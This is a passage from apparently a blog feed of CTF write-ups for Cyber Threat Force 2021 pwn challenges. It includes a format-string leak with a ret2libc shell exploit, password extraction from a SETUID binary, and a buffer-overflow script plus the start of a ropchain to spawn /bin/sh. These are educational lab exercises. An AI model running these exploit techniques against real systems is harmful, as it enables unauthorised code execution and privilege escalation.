+greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+leaked_io_2_1_stdin &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
+libc_address &lt;span style="color:#f92672">=&lt;/span> leaked_io_2_1_stdin &lt;span style="color:#f92672">-&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>]
+sys &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>])
+sh &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>])
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({&lt;span style="color:#ae81ff">49&lt;/span>: sys &lt;span style="color:#f92672">+&lt;/span> p32(&lt;span style="color:#ae81ff">0xcafebabe&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> sh}))
+r&lt;span style="color:#f92672">.&lt;/span>interactive()
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+main()
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was in &lt;code>/home/ctf/flag.txt&lt;/code>: &lt;code>CYBERTF{l3@ks_I5_Us3Fu11}&lt;/code>.&lt;/p>
+&lt;h2 id="level-2-privesc">Level 2: PrivEsc&lt;/h2>
+&lt;p>Looking in &lt;code>/bin&lt;/code> again, we find a &lt;code>readline&lt;/code> SETUID binary. I used the same snippet to download the file:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%2$p-&amp;#39;&lt;/span>)
+greeting &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">&amp;#39;: &amp;#39;&lt;/span>)
+leaked_io_2_1_stdin &lt;span style="color:#f92672">=&lt;/span> int(greeting&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>)[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>decode(), &lt;span style="color:#ae81ff">16&lt;/span>)
+libc_address &lt;span style="color:#f92672">=&lt;/span> leaked_io_2_1_stdin &lt;span style="color:#f92672">-&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;io_2_1_stdin&amp;#39;&lt;/span>]
+sys &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>])
+sh &lt;span style="color:#f92672">=&lt;/span> p32(libc_address &lt;span style="color:#f92672">+&lt;/span> libc_config[&lt;span style="color:#e6db74">&amp;#39;str_bin_sh&amp;#39;&lt;/span>])
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({&lt;span style="color:#ae81ff">49&lt;/span>: sys &lt;span style="color:#f92672">+&lt;/span> p32(&lt;span style="color:#ae81ff">0xcafebabe&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> sh}))
+&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;readline&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;wb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;cat /bin/readline&amp;#39;&lt;/span>)
+r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">&amp;#39;exit&amp;#39;&lt;/span>)
+f&lt;span style="color:#f92672">.&lt;/span>write(r&lt;span style="color:#f92672">.&lt;/span>recvall())
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can look at the binary in Ghidra:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> param_1,&lt;span style="color:#66d9ef">long&lt;/span> param_2) {
+&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
+size_t sVar2;
+undefined8 uVar3;
+FILE &lt;span style="color:#f92672">*&lt;/span>__stream;
+&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pcVar4;
+&lt;span style="color:#66d9ef">long&lt;/span> lVar5;
+undefined8 &lt;span style="color:#f92672">*&lt;/span>puVar6;
+&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
+byte bVar7;
+undefined8 local_426;
+undefined4 local_41e;
+undefined2 local_41a;
+undefined8 local_418;
+undefined8 local_410;
+undefined8 local_408 [&lt;span style="color:#ae81ff">127&lt;/span>];
+&lt;span style="color:#66d9ef">long&lt;/span> local_10;
+bVar7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
+setreuid(&lt;span style="color:#ae81ff">0x3e9&lt;/span>,&lt;span style="color:#ae81ff">0x3e9&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>) {
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+exit(&lt;span style="color:#ae81ff">1&lt;/span>);
+}
+local_426 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xaa333231efbeadde&lt;/span>;
+local_41e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xc0ddccbb&lt;/span>;
+local_41a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xeeff&lt;/span>;
+puts(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>);
+sVar2 &lt;span style="color:#f92672">=&lt;/span> strlen(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>));
+&lt;span style="color:#66d9ef">if&lt;/span> (sVar2 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xe&lt;/span>) {
+iVar1 &lt;span style="color:#f92672">=&lt;/span> check(&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_426,&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>),&lt;span style="color:#ae81ff">0xe&lt;/span>,&lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>));
+&lt;span style="color:#66d9ef">if&lt;/span> (iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+puts(&lt;span style="color:#e6db74">&amp;#34;Password check&amp;#34;&lt;/span>);
+local_418 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_410 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+lVar5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7e&lt;/span>;
+puVar6 &lt;span style="color:#f92672">=&lt;/span> local_408;
+&lt;span style="color:#66d9ef">while&lt;/span> (lVar5 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
+lVar5 &lt;span style="color:#f92672">=&lt;/span> lVar5 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;span style="color:#f92672">*&lt;/span>puVar6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puVar6 &lt;span style="color:#f92672">=&lt;/span> puVar6 &lt;span style="color:#f92672">+&lt;/span> (ulong)bVar7 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+__stream &lt;span style="color:#f92672">=&lt;/span> fopen(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>)(param_2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>),&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">while&lt;/span>( true ) {
+pcVar4 &lt;span style="color:#f92672">=&lt;/span> fgets((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418,&lt;span style="color:#ae81ff">0x400&lt;/span>,__stream);
+&lt;span style="color:#66d9ef">if&lt;/span> (pcVar4 &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
+puts((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_418);
+}
+uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;span style="color:#66d9ef">else&lt;/span> {
+puts(&lt;span style="color:#e6db74">&amp;#34;Password failed&amp;#34;&lt;/span>);
+uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+}
+&lt;span style="color:#66d9ef">else&lt;/span> {
+uVar3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span> (local_10 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>)) {
+&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
+__stack_chk_fail();
+}
+&lt;span style="color:#66d9ef">return&lt;/span> uVar3;
+}
+&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1,&lt;span style="color:#66d9ef">long&lt;/span> param_2,ulong param_3) {
+ulong local_10;
+local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;span style="color:#66d9ef">while&lt;/span>( true ) {
+&lt;span style="color:#66d9ef">if&lt;/span> (param_3 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> local_10) {
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_1) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_2)) &lt;span style="color:#66d9ef">break&lt;/span>;
+local_10 &lt;span style="color:#f92672">=&lt;/span> local_10 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+}
+&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_1) &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(local_10 &lt;span style="color:#f92672">+&lt;/span> param_2);
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The program basically takes two arguments: a password, and a file path. If the password is correct, then the file content will be printed out.&lt;/p>
+&lt;p>The &lt;code>check&lt;/code> function is basically a &lt;code>strcmp&lt;/code> clone, so the password is contained in &lt;code>local_426&lt;/code>. Ghidra errors out a bit here, &lt;code>local_426&lt;/code>, &lt;code>local_41e&lt;/code> and &lt;code>local_41a&lt;/code> are all the same variable.&lt;/p>
+&lt;p>Knowing this, we can now get the flag (which is in the home of the binary owner):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ /bin/readline &lt;span style="color:#66d9ef">$(&lt;/span>perl -e &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;\xde\xad\xbe\xef\x31\x32\x33\xaa\xbb\xcc\xdd\xc0\xff\xee /home/ctf_cracked/flag.txt&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#66d9ef">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{None_asciiPrint@ble:p}&lt;/code>.&lt;/p>
+&lt;h2 id="more">More&lt;/h2>
+&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof2">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : bof_1 (with GetShell &amp; PrivEsc)</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/</link><pubDate>Wed, 07 Jul 2021 19:12:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/</guid><description>For this challenge, we were given a service executable. It was also hosted remotely.
+NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.
+Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ ./service hello who are you? vivescere Hello vivescere We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily.</description><content>&lt;p>For this challenge, we were given a service executable. It was also hosted remotely.&lt;/p>
+&lt;p>NOTE: since I&amp;rsquo;m writting this after the CTF ended, the demos are done locally.&lt;/p>
+&lt;h2 id="level-1">Level 1&lt;/h2>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ checksec service
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
+Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
+$ ./service
+hello who are you?
+vivescere
+Hello vivescere
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won&amp;rsquo;t have access to the libc easily. Using Ghidra, we can look at the main function:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+undefined8 local_38;
+undefined8 local_30;
+undefined8 local_28;
+undefined8 local_20;
+undefined8 local_18;
+ignorMe();
+local_38 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_30 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_28 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_20 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+local_18 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+puts(&lt;span style="color:#e6db74">&amp;#34;hello who are you?&amp;#34;&lt;/span>);
+__isoc99_scanf(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DAT_0049f052,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_38);
+printf(&lt;span style="color:#e6db74">&amp;#34;Hello %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_38);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looks like a simple bof. We can directly find out the offset using GDB and &lt;code>cycle&lt;/code> from pwntools:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cyclic &lt;span style="color:#ae81ff">100&lt;/span>
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+$ gdb ./service
+...
+gef➤ r
+Starting program: /home/vivescere/ctf/bof_1/service
+hello who are you?
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+...
+$rbp : 0x6161616e6161616d &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;maaanaaa&amp;#34;&lt;/span>?&lt;span style="color:#f92672">)&lt;/span>
+...
+&lt;span style="color:#f92672">[&lt;/span>!&lt;span style="color:#f92672">]&lt;/span> Cannot disassemble from $PC
+────────────────────────────────────────────────────────────────────────────────────── threads ────
+&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] Id 1, Name: &amp;#34;service&amp;#34;, stopped 0x4019a8 in main (), reason: SIGSEGV&lt;/span>
+──────────────────────────────────────────────────────────────────────────────────────── trace ────
+&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#75715e">#0] 0x4019a8 → main()&lt;/span>
+───────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ q
+$ cyclic -l 0x6161616e
+&lt;span style="color:#ae81ff">52&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have the offset, and could probably use a ropchain to pop a shell. But that&amp;rsquo;s not the goal of this level. Using Ghidra again, we search for the flag format (&lt;code>CYBERTF{...}&lt;/code>). An interesting function pops up: &lt;code>magie&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">magie&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> param_1) {
+&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
+undefined8 local_15;
+undefined4 local_d;
+undefined local_9;
+local_15 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7b46545245425943&lt;/span>;
+local_d &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x7d595a59&lt;/span>;
+local_9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;span style="color:#66d9ef">if&lt;/span> ((param_1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (iVar1 &lt;span style="color:#f92672">=&lt;/span> thunk_FUN_004010e6(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{YZY}&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_15), iVar1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
+puts(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{_____________________}&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span>;
+}
+puts(&lt;span style="color:#e6db74">&amp;#34;Good Way&amp;#34;&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span>;
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>CYBERTF{_____________________}&lt;/code> is replaced by the real flag when connecting to the challenge remotely. A check seems to be in place, but we can simply jump past it.&lt;/p>
+&lt;p>After whipping out a quick script (using &lt;a href="https://github.com/io12/pwninit">pwninit&lt;/a>), we get the flag:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
+context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> exe
+context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;konsole&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>]
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">conn&lt;/span>():
+&lt;span style="color:#66d9ef">if&lt;/span> args&lt;span style="color:#f92672">.&lt;/span>LOCAL:
+r &lt;span style="color:#f92672">=&lt;/span> process([exe&lt;span style="color:#f92672">.&lt;/span>path])
+&lt;span style="color:#66d9ef">else&lt;/span>:
+r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#34;XXX.XXX.XXX.XXX&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">00000&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> r
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
+r &lt;span style="color:#f92672">=&lt;/span> conn()
+&lt;span style="color:#75715e"># Jump into magie, right where the function prints the flag&lt;/span>
+offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">56&lt;/span>
+r&lt;span style="color:#f92672">.&lt;/span>sendline(flat({offset: p64(&lt;span style="color:#ae81ff">0x4018da&lt;/span>)}))
+&lt;span style="color:#66d9ef">print&lt;/span>(r&lt;span style="color:#f92672">.&lt;/span>recvall()&lt;span style="color:#f92672">.&lt;/span>decode(errors&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ignore&amp;#39;&lt;/span>))
+r&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+main()
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python solve_basic.py LOCAL
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>
+Arch: amd64-64-little
+RELRO: Partial RELRO
+Stack: Canary found
+NX: NX enabled
+PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Starting local process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span>: pid &lt;span style="color:#ae81ff">650148&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Receiving all data: Done &lt;span style="color:#f92672">(&lt;/span>116B&lt;span style="color:#f92672">)&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Process &lt;span style="color:#e6db74">&amp;#39;/home/vivescere/ctf/bof_1/service&amp;#39;&lt;/span> stopped with exit code -7 &lt;span style="color:#f92672">(&lt;/span>SIGBUS&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>pid 650148&lt;span style="color:#f92672">)&lt;/span>
+hello who are you?
+Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>
+CYBERTF&lt;span style="color:#f92672">{&lt;/span>_____________________&lt;span style="color:#f92672">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag was &lt;code>CYBERTF{B@sic_Buff3r_Ov3rflow}&lt;/code>.&lt;/p>
+&lt;h2 id="level-2-getshell">Level 2: GetShell&lt;/h2>
+&lt;p>Our goal is now to pop a shell. We still have the NX bit on, so we could try using a ropchain. Since the CTF was short, I first tried to automatically generate one using &lt;code>ropper&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ropper --file service --chain &lt;span style="color:#e6db74">&amp;#34;execve cmd=/bin/sh&amp;#34;&lt;/span>
+...
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The command worked, so I just plugged it into my previous script:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> struct &lt;span style="color:#f92672">import&lt;/span> pack
+exe &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#34;./service&amp;#34;&lt;/span>)
